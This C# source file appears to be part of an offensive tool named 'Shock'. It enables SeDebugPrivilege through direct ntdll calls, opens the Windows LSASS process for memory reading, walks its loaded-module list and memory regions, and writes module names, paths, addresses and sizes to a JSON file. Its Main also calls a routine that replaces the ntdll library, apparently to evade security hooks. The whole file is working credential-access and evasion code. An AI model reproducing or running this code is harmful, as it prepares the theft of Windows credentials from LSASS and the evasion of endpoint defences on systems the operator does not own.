using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using static Shock.NT;


namespace Shock
{
    public class ModuleInformation
    {
        public string Name { get; set; }
        public string FullPath { get; set; }
        public IntPtr Address { get; set; }
        public int Size { get; set; }

        public ModuleInformation(string name, string fullpath, IntPtr address, int size)
        {
            Name = name;
            FullPath = fullpath;
            Address = address;
            Size = size;
        }
    }


    internal class Program
    {
        [StructLayout(LayoutKind.Sequential)]
        public struct LUID
        {
            public uint LowPart;
            public int HighPart;
        }


        [StructLayout(LayoutKind.Sequential)]
        public struct TOKEN_PRIVILEGES
        {
            public uint PrivilegeCount;
            public LUID Luid;
            public uint Attributes;
        }


        [StructLayout(LayoutKind.Sequential, Pack = 0)]
        public struct OBJECT_ATTRIBUTES
        {
            public int Length;
            public IntPtr RootDirectory;
            public IntPtr ObjectName;
            public uint Attributes;
            public IntPtr SecurityDescriptor;
            public IntPtr SecurityQualityOfService;
        }


        [StructLayout(LayoutKind.Sequential)]
        public struct CLIENT_ID
        {
            public IntPtr UniqueProcess;
            public IntPtr UniqueThread;
        }


        [StructLayout(LayoutKind.Sequential)]
        public struct MEMORY_BASIC_INFORMATION
        {
            public IntPtr BaseAddress;
            public IntPtr AllocationBase;
            public int AllocationProtect;
            public IntPtr RegionSize;
            public int State;
            public int Protect;
            public int Type;
        }


        [DllImport("ntdll.dll")]
        public static extern uint NtOpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, ref IntPtr TokenHandle);

        [DllImport("ntdll.dll")]
        public static extern uint NtAdjustPrivilegesToken(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);

        [DllImport("ntdll.dll")]
        public static extern uint NtClose(IntPtr hObject);

        [DllImport("ntdll.dll")]
        public static extern uint NtOpenProcess(ref IntPtr ProcessHandle, uint DesiredAccess, ref OBJECT_ATTRIBUTES ObjectAttributes, ref CLIENT_ID processId);

        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern uint NtQueryInformationProcess(IntPtr processHandle, int processInformationClass, IntPtr pbi, uint processInformationLength, out uint returnLength);

        [DllImport("ntdll.dll")]
        public static extern uint NtReadVirtualMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

        [DllImport("ntdll.dll")]
        public static extern uint NtQueryVirtualMemory(IntPtr hProcess, IntPtr lpAddress, uint MemoryInformationClass, out MEMORY_BASIC_INFORMATION MemoryInformation, uint MemoryInformationLength, out uint ReturnLength);


        public const uint TOKEN_ADJUST_PRIVILEGES = 0x00000020;
        public const uint TOKEN_QUERY = 0x00000008;
        public const uint PROCESS_QUERY_INFORMATION = 0x0400;
        public const uint PROCESS_VM_READ = 0x0010;
        public const uint MemoryBasicInformation = 0;
        public const int MEM_COMMIT = 0x00001000;
        public const int PAGE_NOACCESS = 0x01;


        static void EnableDebugPrivileges()
        {
            IntPtr currentProcess = Process.GetCurrentProcess().Handle;
            IntPtr tokenHandle = IntPtr.Zero;
            try
            {
                uint ntstatus = NtOpenProcessToken(currentProcess, TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, ref tokenHandle);
                if (ntstatus != 0)
                {
                    Console.WriteLine("[-] Error calling NtOpenProcessToken. NTSTATUS: 0x" + ntstatus.ToString("X"));
                    Environment.Exit(-1);
                }

                TOKEN_PRIVILEGES tokenPrivileges = new TOKEN_PRIVILEGES
                {
                    PrivilegeCount = 1,
                    Luid = new LUID { LowPart = 20, HighPart = 0 }, // LookupPrivilegeValue(null, "SeDebugPrivilege", ref luid);
                    Attributes = 0x00000002
                };

                ntstatus = NtAdjustPrivilegesToken(tokenHandle, false, ref tokenPrivileges, (uint)Marshal.SizeOf(typeof(TOKEN_PRIVILEGES)), IntPtr.Zero, IntPtr.Zero);
                if (ntstatus != 0)
                {
                    Console.WriteLine("[-] Error calling NtAdjustPrivilegesToken. NTSTATUS: 0x" + ntstatus.ToString("X") + ". Maybe you need to calculate the LowPart of the LUID using LookupPrivilegeValue");
                    Environment.Exit(-1);
                }
            }
            finally
            {
                if (tokenHandle != IntPtr.Zero)
                {
                    NtClose(tokenHandle);
                }
            }
        }


        public static IntPtr ReadRemoteIntPtr(IntPtr hProcess, IntPtr mem_address)
        {
            byte[] buff = new byte[8];
            uint ntstatus = NtReadVirtualMemory(hProcess, mem_address, buff, buff.Length, out _);
            if (ntstatus != 0)
            {
                Console.WriteLine("[-] Error calling NtReadVirtualMemory. NTSTATUS: 0x" + ntstatus.ToString("X") + " reading address 0x" + mem_address.ToString("X"));
            }
            long value = BitConverter.ToInt64(buff, 0);
            return (IntPtr)value;
        }


        public static string ReadRemoteWStr(IntPtr hProcess, IntPtr mem_address)
        {
            byte[] buff = new byte[256];
            uint ntstatus = NtReadVirtualMemory(hProcess, mem_address, buff, buff.Length, out _);
            if (ntstatus != 0 )
            {
                Console.WriteLine("[-] Error calling NtReadVirtualMemory. NTSTATUS: 0x" + ntstatus.ToString("X") + " reading address 0x" + mem_address.ToString("X"));
            }
            string unicode_str = "";
            for (int i = 0; i < buff.Length - 1; i += 2)
            {
                if (buff[i] == 0 && buff[i + 1] == 0) { break; }
                unicode_str += BitConverter.ToChar(buff, i);
            }
            return unicode_str;
        }



        public unsafe static List<ModuleInformation> CustomGetModuleHandle(IntPtr hProcess)
        {
            List<ModuleInformation> moduleInformationList = new List<ModuleInformation>();

            uint process_basic_information_size = 48;
            int peb_offset = 0x8;
            int ldr_offset = 0x18;
            int inInitializationOrderModuleList_offset = 0x30;
            int flink_dllbase_offset = 0x20;
            int flink_buffer_fulldllname_offset = 0x40;
            int flink_buffer_offset = 0x50;

            // Create byte array with the size of the PROCESS_BASIC_INFORMATION structure
            byte[] pbi_byte_array = new byte[process_basic_information_size];

            // Create a PROCESS_BASIC_INFORMATION structure in the byte array
            IntPtr pbi_addr = IntPtr.Zero;
            fixed (byte* p = pbi_byte_array)
            {
                pbi_addr = (IntPtr)p;

                uint ntstatus = NtQueryInformationProcess(hProcess, 0x0, pbi_addr, process_basic_information_size, out uint ReturnLength);
                if (ntstatus != 0)
                {
                    Console.WriteLine("[-] Error calling NtQueryInformationProcess. NTSTATUS: 0x" + ntstatus.ToString("X"));
                }
            }

            // Get PEB Base Address
            IntPtr peb_pointer = pbi_addr + peb_offset;
            IntPtr pebaddress = Marshal.ReadIntPtr(peb_pointer);

            // Get Ldr 
            IntPtr ldr_pointer = pebaddress + ldr_offset;
            IntPtr ldr_adress = ReadRemoteIntPtr(hProcess, ldr_pointer);

            IntPtr InInitializationOrderModuleList = ldr_adress + inInitializationOrderModuleList_offset;
            IntPtr next_flink = ReadRemoteIntPtr(hProcess, InInitializationOrderModuleList);

            IntPtr dll_base = (IntPtr)1337;
            while (dll_base != IntPtr.Zero)
            {
                next_flink = next_flink - 0x10;
                // Get DLL base address
                dll_base = ReadRemoteIntPtr(hProcess, (next_flink + flink_dllbase_offset));
                IntPtr buffer = ReadRemoteIntPtr(hProcess, (next_flink + flink_buffer_offset));
                // DLL base name
                string base_dll_name = "";
                if (buffer != IntPtr.Zero) {
                    base_dll_name = ReadRemoteWStr(hProcess, buffer);
                }
                // DLL full path
                string full_dll_path = ReadRemoteWStr(hProcess, ReadRemoteIntPtr(hProcess, (next_flink + flink_buffer_fulldllname_offset)));

                moduleInformationList.Add(new ModuleInformation(base_dll_name.ToLower(), full_dll_path, dll_base, 0));
                next_flink = ReadRemoteIntPtr(hProcess, (next_flink + 0x10));
            }
            return moduleInformationList;
        }


        public static string ToJson(string[] array)
        {
            string json_str = "{";
            for (int i = 0; i < array.Length; i++)
            {
                json_str += "\"field" + i.ToString() + "\" : \"" + array[i] + "\" , ";
            }
            return (json_str.Substring(0, json_str.Length - 3) + "}");
        }


        public static string ToJsonArray(string[] array)
        {
            string json_str = "[";
            for (int i = 0; i < array.Length; i++)
            {
                json_str += array[i] + ", ";
            }
            return (json_str.Substring(0, json_str.Length - 2) + "]");
        }


        static void WriteToFile(string path, string content)
        {
            System.IO.File.WriteAllText(path, content);
            Console.WriteLine("[+] File " + path + " generated.");
        }


        static void Shock(string file_name) {
            // Get process name
            string procname = "lsass";

            //Get process PID
            Process[] process_list = Process.GetProcessesByName(procname);
            if (process_list.Length == 0)
            {
                Console.WriteLine("[-] Process " + procname + " not found.");
                Environment.Exit(0);
            }
            int processPID = process_list[0].Id;
            Console.WriteLine("[+] Process PID: \t\t\t\t" + processPID);

            // Get SeDebugPrivilege
            EnableDebugPrivileges();

            // Get process handle with NtOpenProcess
            IntPtr processHandle = IntPtr.Zero;
            CLIENT_ID client_id = new CLIENT_ID();
            client_id.UniqueProcess = (IntPtr)processPID;
            client_id.UniqueThread = IntPtr.Zero;
            OBJECT_ATTRIBUTES objAttr = new OBJECT_ATTRIBUTES();
            uint ntstatus = NtOpenProcess(ref processHandle, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, ref objAttr, ref client_id);
            if (ntstatus != 0)
            {
                Console.WriteLine("[-] Error calling NtOpenProcess. NTSTATUS: 0x" + ntstatus.ToString("X"));
            }
            Console.WriteLine("[+] Process handle:  \t\t\t\t" + processHandle);

            // Loop the memory regions
            long proc_max_address_l = (long)0x7FFFFFFEFFFF;
            IntPtr mem_address = IntPtr.Zero;

            // Get modules information
            List<ModuleInformation> moduleInformationList = CustomGetModuleHandle(processHandle);

            int aux_size = 0;
            string aux_name = "";

            while ((long)mem_address < proc_max_address_l)
            {
                // Populate MEMORY_BASIC_INFORMATION struct
                MEMORY_BASIC_INFORMATION mbi = new MEMORY_BASIC_INFORMATION();
                ntstatus = NtQueryVirtualMemory(processHandle, (IntPtr)mem_address, MemoryBasicInformation, out mbi, 0x30, out _);
                if (ntstatus != 0)
                {
                    Console.WriteLine("[-] Error calling NtQueryVirtualMemory. NTSTATUS: 0x" + ntstatus.ToString("X"));
                }

                // If readable and commited --> Write memory region to a file
                if (mbi.Protect != PAGE_NOACCESS && mbi.State == MEM_COMMIT)
                {
                    ModuleInformation aux_module = moduleInformationList.Find(obj => obj.Name == aux_name);

                    if ((int)mbi.RegionSize == 0x1000 && mbi.BaseAddress != aux_module.Address)
                    {
                        aux_module.Size = aux_size;
                        int aux_index = moduleInformationList.FindIndex(obj => obj.Name == aux_name);
                        moduleInformationList[aux_index] = aux_module;

                        foreach (ModuleInformation modInfo in moduleInformationList)
                        {
                            if (mbi.BaseAddress == modInfo.Address)
                            {
                                aux_name = modInfo.Name.ToLower();
                                aux_size = (int)mbi.RegionSize;
                            }
                        }
                    }
                    else
                    {
                        aux_size += (int)mbi.RegionSize;
                    }
                }
                // Next memory region
                mem_address = (IntPtr)((ulong)mem_address + (ulong)mbi.RegionSize);
            }

            // Generate JSON
            string[] aux_array_1 = { };
            foreach (ModuleInformation modInfo in moduleInformationList)
            {
                string[] aux_array_2 = { modInfo.Name.ToString(), modInfo.FullPath.ToString().Replace("\\", "\\\\"), ("0x" + modInfo.Address.ToString("X")), modInfo.Size.ToString() };
                aux_array_1 = aux_array_1.Concat(new string[] { ToJson(aux_array_2) }).ToArray();

            }
            string shock_json_content = ToJsonArray(aux_array_1);
            WriteToFile(file_name, shock_json_content);
        }

        static void Main(string[] args)
        {
            // Replace ntdll library
            string option = "default";
            string wildcard_option = "";
            if (args.Length >= 1)
            {
                option = args[0];
            }
            if (args.Length >= 2)
            {
                wildcard_option = args[1];
            }
            ReplaceLibrary(option, wildcard_option);

            // Get modules (ModuleList) information. Argument: Name of JSON file
            Shock("shock.json");
        }
    }
}